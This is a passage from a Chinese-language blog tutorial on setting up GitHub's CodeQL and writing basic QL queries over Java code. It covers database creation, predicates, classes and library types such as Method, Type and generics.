title="codeql的安装"></a>codeql的安装</h2><p>CodeQL主要分为引擎和库两部分，都可以在github上下载，核心的<code>解析引擎部分</code>是不开源的,用于解析数据库执行等操作，库是开源的，针对语言提供了很多函数和类型以方便我们写自己的规则。</p><ol><li><p>由于<code>CodeQL</code>的处理对象并不是源码本身，而是中间生成的AST结构数据库，所以我们先需要把我们的项目源码转换成<code>CodeQL</code>能够识别的<code>CodeDatabase</code>。这里先下载不开源的解析引擎</p><p>所以我们需要先下载codeql的客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/github/codeql-cli-binaries/releases</span><br></pre></td></tr></table></figure></li><li><p>需要下载一下QL库，但这里还有一种更为简单的方法，可以使用<code>vscode-codeql-starter</code>项目进行启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/github/vscode-codeql-starter</span><br></pre></td></tr></table></figure><p>由于其需要加载<code>ql库</code>，所以我们需要使用递归的方式下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/github/vscode-codeql-starter</span><br></pre></td></tr></table></figure><p>主要是加载<code>submoudle</code></p><blockquote><p>简单来说就是一个模块引入了另一个子模块，所以才需要循环下载</p></blockquote></li></ol><p>这里遇到一些问题，就是版本的问题：ql的规则库和cli版本不对应，导致导入之后<code>ql</code>报错，和下图类似：</p><p><img src="https://user-images.githubusercontent.com/1850771/135095922-46fd4798-9dde-4191-80dc-1b73203e8fa8.png" alt="图片"></p><p>参考 issue :<a href="https://github.com/github/codeql/issues/6768">https://github.com/github/codeql/issues/6768</a></p><p>更换了 <code>codeql-cli</code>版本，我是更换到了<code>2.8.0</code>，此时最新版本是<code>2.8.3</code>，使用最新版本会报错。具体内容参考<code>issue</code></p><p>其实官方还提供了一个CodeQL的在线版本：<a href="https://lgtm.com/search">https://lgtm.com/search</a>  ， 可以使用</p><h2 id="一个练习codeql语法的github项目"><a href="#一个练习codeql语法的github项目" class="headerlink" title="一个练习codeql语法的github项目"></a>一个练习codeql语法的github项目</h2><p><a href="https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)">https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)</a></p><h2 id="codeql数据库操作"><a href="#codeql数据库操作" class="headerlink" title="codeql数据库操作"></a>codeql数据库操作</h2><p>需要先创建数据库</p><p><code>codeql database create &lt;database&gt; --language=&lt;language-identifier&gt; -source-root=&lt;path&gt; --command=&quot;mvn clean install --file pom.xml&quot;</code></p><blockquote><p>注意：如果省略<code>--command</code>参数，则 codeQL 会自动检测并使用自己的工具来构建。但还是强烈推荐使用自己自定义的参数，尤其是大项目时。</p></blockquote><p>更新数据库</p><p><code>codeql database upgrade &lt;path&gt;</code></p><p>对于建好的数据库，他的目录目录应该是如下的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- log/                # 输出的日志信息</span><br><span class="line">- db-java/            # 编译的数据库</span><br><span class="line">- src.zip             # 编译所对应的目标源码</span><br><span class="line">- codeql-database.yml # 数据库相关配置</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>对于非编译性的语言来说，直接扫描,像php，python等脚本语言可以不用编译</li><li>对于java这种语言来说，需要先经过编译。对于go来说，可编译也可不编译</li></ol><p>可以使用<code>codeql resolve languages</code>来看<code>codeql</code>支持哪些语言的版本</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220314114754.png"></p><h2 id="第一个codeql代码"><a href="#第一个codeql代码" class="headerlink" title="第一个codeql代码"></a>第一个codeql代码</h2><p>这里在<code>Vscode</code>上安装了对应的扩展，直接搜索<code>codeql</code>即可</p><p>测试代码样例：<a href="https://github.com/l4yn3/micro_service_seclab/">https://github.com/l4yn3/micro_service_seclab/</a></p><blockquote><p>其他项目：在 Github Learning Lab 中，有一个用于学习 CodeQL 的入门课程 - CodeQL U-Boot Challenge (C&#x2F;C++)]</p><p><a href="https://lab.github.com/GitHubtraining/codeql-u-boot-challenge-%28cc++%29">https://lab.github.com/GitHubtraining/codeql-u-boot-challenge-%28cc++%29</a></p></blockquote><p>上面我们提到，我们需要使用codeql引擎，将需要分析的项目，转换成，可以被codeql识别的<code>database</code>，这个过程中，codeql引擎把我们的<code>java代码</code>转换成了可识别的<code>AST数据库</code>。</p><p>AST分析出来是这样子的(需要对单独的类进行分析)</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211206221432.png"></p><p>先导入qlpack.yml文件</p><p>这一步其实可以直接再<code>starter</code>里面写，但是也可以将<code>starter和 新的文件夹 加入工作区</code>，后者才需要导入<code>qlpack.yml</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">getting-started/codeql-extra-queries-java</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">dependencies:</span></span><br><span class="line">  <span class="comment"># This uses the latest version of the codeql/java-all library.</span></span><br><span class="line">  <span class="comment"># You may want to change to a more precise semver string.</span></span><br><span class="line">  <span class="attr">codeql/java-all:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">queries</span> <span class="attr">language</span>=<span class="string">&quot;java&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>之后进行一下测试，看看能不能进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;hello world&quot;;</span><br></pre></td></tr></table></figure><p>总的来说，QL的查询语句和<code>SQL</code>很像，类似如下结构：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">where</span> i <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><ol><li>第一行表示，我们要引入<code>Codeql</code>的类库，因为我们要分析的项目是java的，所以在ql语句里，必不可少</li><li><code>from int i</code>：表示我们要定义一个变量 i ，他的类型是int，表示我们获取所有int类型的数据</li><li><code>where i = 1 表示当i等于1的时候，符合条件</code></li><li><code>select i </code>表示输出 i</li></ol><p>一句话总结就是：在所有的整形数字<code>i</code>中，当<code>i==1</code>的时候，惊奇输出</p><p>这样一来，我们就得到了QL查询的语法结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> [datatype] var</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">condition</span>(var <span class="operator">=</span> something)</span><br><span class="line"><span class="keyword">select</span> var</span><br></pre></td></tr></table></figure><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p>和sql一样，where部分的查询条件如果过长，会显得很乱。Codeql提供一种机制，可以把你很长的查询语句，封装成函数。</p><p>这个函数，就是谓词</p><blockquote><p>predicate 表示当前方法没有返回值。类似于 JAVA中的<code>void</code></p></blockquote><p>谓词方式定义如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">predicate name(type arg)</span><br><span class="line">&#123;</span><br><span class="line">  statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义谓词有三个要素：</p><ul><li>关键词 predicate（如果没有返回值），或者结果的类型（如果当前谓词内存在返回值）</li><li>谓词的名称</li><li>谓词的参数列表</li><li>谓词主体</li></ul><h4 id="1-无返回值的谓词"><a href="#1-无返回值的谓词" class="headerlink" title="1. 无返回值的谓词"></a>1. 无返回值的谓词</h4><ul><li>无返回值的谓词以<code>predicate</code>关键词开头。若传入的值满足谓词主体中的逻辑，则该谓词将保留该值。</li><li>无返回值谓词的使用范围较小，但仍然在某些情况下扮演了很重要的一个角色</li><li>举一个简单的例子</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">predicate isSmall(<span class="type">int</span> i) &#123;</span><br><span class="line">  i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> i </span><br><span class="line"><span class="keyword">where</span> isSmall(i) <span class="operator">/</span><span class="operator">/</span> 将整数集合i从正无穷大的数据集含，限制至 <span class="number">1</span><span class="number">-9</span></span><br><span class="line"><span class="keyword">select</span> i</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 输出 <span class="number">1</span><span class="number">-9</span> 的数字</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220315144928.png"></p><p>若传入的 <code>i</code> 是小于 10 的正整数，则 <code>isSmall(i)</code> 将会使得传入的集合 <code>i</code> 只保留符合条件的值，其他值将会被舍弃。</p><h4 id="2-有返回值的谓词"><a href="#2-有返回值的谓词" class="headerlink" title="2. 有返回值的谓词"></a>2. 有返回值的谓词</h4><p>当需要将某些结果从谓词中返回时，与编程语言的 return 语句不同的是，谓词使用的是一个特殊变量 <code>result</code>。谓词主体的语法只是为了表述逻辑之间的关系，因此务必不要用一般编程语言的语法来理解。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> getSuccessor(<span class="type">int</span> i) &#123;</span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span> 若传入的 i 位于 <span class="number">1</span><span class="number">-9</span> 内，则返回 i<span class="operator">+</span><span class="number">1</span></span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span> i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">select</span> getSuccessor(<span class="number">3</span>)  <span class="operator">/</span><span class="operator">/</span> 输出<span class="number">4</span></span><br><span class="line"><span class="keyword">select</span> getSuccessor(<span class="number">33</span>) <span class="operator">/</span><span class="operator">/</span> 不输出任何信息</span><br></pre></td></tr></table></figure><p>在谓词主体中，<code>result</code> 变量可以像一般变量一样正常使用，唯一不同的是这个变量内的数据将会被返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Germany&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> getANeighbor(&quot;France&quot;)</span><br></pre></td></tr></table></figure><p>这里会返回两个结果：”Belgium” 与 “Germany”</p><p>谓词不允许描述的数据集合个数<strong>不限于有限数量大小</strong>的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 该谓词将使得编译报错</span><br><span class="line"><span class="type">int</span> multiplyBy4(<span class="type">int</span> i) &#123;</span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span> i 是一个数据集合，此时该集合可能是「无限大小」</span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span> <span class="keyword">result</span> 集合被设置为 i<span class="operator">*</span><span class="number">4</span>，意味着 <span class="keyword">result</span> 集合的大小有可能也是无限大小</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">*</span> <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但如果我们仍然需要定义这类函数，则必须<strong>限制集合数据大小</strong>，同时添加一个 <code>bindingset</code> 标注。该标注将会声明谓词 <code>plusOne</code> 所包含的数据集合是有限的，前提是 <code>i</code> 绑定到有限数量的数据集合。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">bindingset [x] bindingset [y]</span><br><span class="line">predicate pulsOne(<span class="type">int</span> x,<span class="type">int</span> y) &#123;</span><br><span class="line">    y <span class="operator">=</span> x <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> x ,<span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">42</span> <span class="keyword">and</span> pulsOne(x, y)</span><br><span class="line"><span class="keyword">select</span> x,y</span><br></pre></td></tr></table></figure><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>在 CodeQL 中的类，<strong>并不意味着建立一个新的对象</strong>，而只是表示特定一类的数据集合，定义一个类，需要三个步骤：</p><ul><li>使用关键字<code>class</code></li><li>起一个类名，其中类名必须是首字母大写的。</li><li>确定是从哪个类中派生出来的</li></ul><p>其中，基本类型 <code>boolean</code>、<code>float</code>、<code>int</code>、<code>string</code> 以及 <code>date</code> 也算在内。</p><p>如官方的案例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class OneTwoThree extends <span class="type">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="operator">/</span><span class="operator">/</span> characteristic predicate</span><br><span class="line">      this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">2</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    string getAString() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      <span class="keyword">result</span> <span class="operator">=</span> &quot;One, two or three: &quot; <span class="operator">+</span> this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate isEven() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      this <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">2</span>] </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">from</span> OneTwoThree i</span><br><span class="line">  <span class="keyword">where</span> i <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> i.getAString() <span class="operator">=</span> &quot;One, two or three: 2&quot;</span><br><span class="line">  <span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><p><code>可以直接从输出的结果中查询到数据：输出1和2</code></p><p>其中，<strong>特征谓词</strong>类似于类的构造函数，它将会进一步限制当前类所表示数据的集合。它将数据集合从原先的 <code>Int</code> 集，进一步限制至 1-3 这个范围。<code>this</code> 变量表示的是当前类中所包含的数据集合。与 <code>result</code> 变量类似，<code>this</code>同样是用于表示数据集合直接的关系。</p><p>此外，在特征谓词中，比较常用的一个关键字是 <code>exists</code>。该关键字的语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exists</span>(<span class="operator">&lt;</span>variable declarations<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula<span class="operator">&gt;</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 以下两个 <span class="keyword">exists</span> 所表达的意思等价。</span><br><span class="line"><span class="keyword">exists</span>(<span class="operator">&lt;</span>variable declarations<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula <span class="number">1</span><span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula <span class="number">2</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">exists</span>(<span class="operator">&lt;</span>variable declarations<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>formula <span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">and</span> <span class="operator">&lt;</span>formula <span class="number">2</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>这个关键字的使用引入了一些新的变量。如果变量中至少有一组值可以使 formula 成立，那么该值将被保留。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">predicate isStudent(<span class="keyword">Method</span> <span class="keyword">method</span>) &#123;</span><br><span class="line">    <span class="keyword">exists</span>( <span class="operator">|</span> method.hasName(&quot;getStudent&quot;) )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> <span class="keyword">method</span></span><br><span class="line"><span class="keyword">where</span>  isStudent(<span class="keyword">method</span>)</span><br><span class="line"><span class="keyword">select</span> method.getName(),method.getDeclaringType()</span><br></pre></td></tr></table></figure><h3 id="类库"><a href="#类库" class="headerlink" title="类库"></a>类库</h3><p>上面提到的<code>method</code>变量，具体和<code>java反射</code>中的变量相似，结合生成的<code>AST</code>结构的代码来看</p><p>比方说，我们想获取类中所有的方法，在AST里面的Method代表的就是类当中的方法，</p><p>我们想过的所有方法的调用，MethodAccess获取的就是所有方法调用</p><table><thead><tr><th>名称</th><th>解释</th></tr></thead><tbody><tr><td>Method</td><td>方法类，表示获取当前项目中所有的方法</td></tr><tr><td>MethodAccess</td><td>方法调用类，MethodAccess call表示获取当前项目中所有方法调用</td></tr><tr><td>Parameter</td><td>参数类，Parameter表示当前项目中所有存在的参数</td></tr></tbody></table><p>结合ql的语法，我们尝试获取micro-service-seclab项目中定义的所有方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> <span class="keyword">method</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">method</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207133722.png"></p><p>我们在通过Method类内置的一些方法，把结果过滤一下，比如我们获取的名字是<code>getStudent</code>的方法名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> <span class="keyword">method</span></span><br><span class="line"><span class="keyword">where</span> method.hasName(&quot;getStudent&quot;)</span><br><span class="line"><span class="keyword">select</span> method.getName(),method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207134053.png"></p><blockquote><p>method.getName() 获取的是当前方法的名称</p><p>method.getDeclaringType() 获取的是当前方法所属class的名称。</p></blockquote><p>java 有 五大类库</p><ul><li><code>Program Elements</code>，程序元素，例如类和方法</li><li><code>AST nodes</code>，抽象树节点，例如语句和表达式</li><li><code>Metadata</code>，元数据，例如注解和注释</li><li><code>metrics</code>，计算指标，例如循环复杂度</li><li><code>Call Gragh</code>，调用图</li></ul><p>这些类包括：包（Package）、编译单元（CompilationUnit）、类型（Type）、方法（Method）、构造函数（Constructor）和变量（Variable）。</p><p>它们共同的超类是 Element，它提供了常用的成员谓词，用于确定程序元素的名称和检查两个元素是否相互嵌套。</p><p>因此可以方便的引用一个方法或构造函数的元素。此外，<code>Callable</code> 类是 <code>Method</code> 和 <code>Constructor</code> 的共同超类，可以用于此目的。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202181451240.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202181451240.png-water_print"></p><p>具体如图所示</p><h4 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h4><p>类 Type 有许多子类，用于表示不同种类的类型。</p><ul><li><code>PrimitiveType</code> 表示原始类型，即 <code>boolean</code>, <code>byte</code>, <code>char</code>, <code>double</code>, <code>float</code>, <code>int</code>, <code>long</code>, <code>short</code>；QL 也将 <code>void</code> 和 <code>nulltype</code> 归为原始类型。</li><li>RefType是非原始类型，它又有几个子类。<ul><li><code>Class</code></li><li><code>interface</code></li><li><code>enum</code></li><li><code>Array</code></li></ul></li></ul><p>例如， 如果我们要查询程序中所有的<code>int</code>类型的变量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Variable v, PrimitiveType pt</span><br><span class="line"><span class="keyword">where</span> pt <span class="operator">=</span> v.getType() <span class="keyword">and</span></span><br><span class="line">    pt.hasName(&quot;int&quot;)</span><br><span class="line"><span class="keyword">select</span> v</span><br></pre></td></tr></table></figure><p>引用类型也是根据他们的声明范围来划分的</p><ul><li><code>TopLevelType</code> 代表在编译单元(一个 <code>.java</code> 文件)的顶层声明的类。</li><li><code>NestedType</code> 是一个在另一个类型内声明的类型。<ul><li><code>LoadClass</code>：在成员方法或构造方法中声明的类</li><li><code>AnonymousClass</code>：匿名类</li></ul></li></ul><p>如下，可以找到所有名称与编译单元不一致的顶层类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TopLevelType tl</span><br><span class="line"><span class="keyword">where</span> tl.getName() <span class="operator">!=</span> tl.getCompilationUnit().getName()</span><br><span class="line"><span class="keyword">select</span> tl</span><br></pre></td></tr></table></figure><p>最后，该库还有一些单例子类，如：<code>TypeObject</code>、<code>TypeCloneable</code>、<code>TypeRuntime</code>、<code>TypeSerializable</code>、TypeString、<code>TypeSystem</code> 和 <code>TypeClass</code>。每个 CodeQL 类都代表其名称所暗示的标准 Java 类。</p><p>一个找到所有直接继承 <code>Object</code> 的嵌套类的查询</p><blockquote><p>NestedClass  —-&gt; 嵌套类</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> NestedClass nc</span><br><span class="line"><span class="keyword">where</span> nc.getASupertype() instanceof TypeObject</span><br><span class="line"><span class="keyword">select</span> nc</span><br></pre></td></tr></table></figure><h4 id="Generics"><a href="#Generics" class="headerlink" title="Generics"></a>Generics</h4><p><code>GenericType</code> 是 <code>GenericInterface</code> 或 <code>GenericClass</code>。它代表了一个泛型型声明，如 Java 标准库中的接口 <code>java.util.Map</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.util.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Map</span>&lt;K, V&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类型参数，如本例中的 K 和 V，由 <code>TypeVariable</code> 类表示。</p><p>一个泛型的参数化实例提供了一个具体实现该类型的参数，如 <code>Map&lt;String, File&gt;</code>。这样的类型由 <code>ParameterizedType</code> 表示，它与 <code>GenericType</code> 不同。要从 <code>ParameterizedType</code> 到其相应的 <code>GenericType</code>，可以使用谓词 <code>getSourceDeclaration</code>。</p><p>我们可以如下查到<code>java.util.Map</code> 的所有参数化实例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> GenericInterface map , ParameterizedType pt </span><br><span class="line"><span class="keyword">where</span> map.hasQualifiedName(&quot;java.util&quot;,&quot;Map&quot;) <span class="keyword">and</span></span><br><span class="line">    pt.getSourceDeclaration()<span class="operator">=</span>map</span><br><span class="line">    </span><br><span class="line"><span class="keyword">select</span> pt</span><br></pre></td></tr></table></figure><p>一般来说，泛型需要限制类型参数可以与哪些类型绑定。例如，一个从字符串到数字的映射类型可以被声明如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StringToNumMap</span>&lt;N <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;String, N&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着 <code>StringToNumberMap</code> 的参数化实例只能使用 <code>Number</code> 或它的一个子类型来实例化类型参数 N，而不能用其它类，如说 <code>File</code>。我们说 <code>N</code> 是一个有界的类型参数，<code>Number</code> 是它的上界。在 QL 中，一个类型变量可以用谓词 <code>getATypeBound</code> 来查询它的类型边界。类型边界本身由 <code>TypeBound</code> 类表示，它有一个成员谓词 <code>getType</code> 来检索变量被约束的类型。</p><p>如下的查询找到所有以<code>Number</code>类型为边界的变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from TypeVariable tv , TypeBound tb</span><br><span class="line"><span class="type">where</span> <span class="variable">tb</span> <span class="operator">=</span> tv.getATypeBound() and</span><br><span class="line">    tb.getType().hasQualifiedName(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Number&quot;</span>)</span><br><span class="line"></span><br><span class="line">select tv</span><br></pre></td></tr></table></figure><p>为了处理那些在泛型出现之前的遗留代码，每个泛型都有一个没有任何类型参数的 「原始」版本。在 CodeQL 库中，原始类型用 <code>RawType</code> 类表示，它有预期的子类 <code>RawClass</code> 和 <code>RawInterface</code>。同样，有一个谓词 <code>getSourceDeclaration</code> 用于获得相应的通用类型。如下的<a 